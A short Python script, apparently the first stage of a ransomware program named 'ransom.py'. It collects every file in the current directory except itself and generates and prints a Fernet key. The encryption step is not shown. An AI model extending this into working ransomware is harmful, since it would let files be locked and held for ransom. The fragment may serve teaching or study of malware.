import os
from cryptography.fernet import Fernet

file_list=[]

for file in os.listdir():
    if file == "ransom.py":
        continue
    if os.path.isfile(file):
        file_list.append(file)

print(file_list)

key = Fernet.generate_key()

print(key)